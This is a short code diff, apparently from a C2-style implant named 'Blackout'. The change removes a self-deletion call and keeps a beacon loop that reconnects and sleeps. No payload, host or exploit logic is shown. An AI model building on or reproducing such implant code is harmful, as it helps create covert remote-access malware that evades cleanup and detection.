@@ -5,11 +5,8 @@ FUNC VOID BlackoutMain(
     _In_ PVOID Param
 ) {
     BLACKOUT_INSTANCE
-    
-    BlackoutInit();
-    
-    if ( !SelfDeletion() )
-        BK_PRINT( "[+] self delete failed %d...\n", NtLastError() );
+
+    BlackoutInit( Param );
 
     do {
         if ( !Instance()->Session.Connected ) {
@@ -18,6 +15,5 @@ FUNC VOID BlackoutMain(
         }
         SleepMain( Instance()->Session.SleepTime * 1000 );
     } while ( TRUE );
-    
 }
 
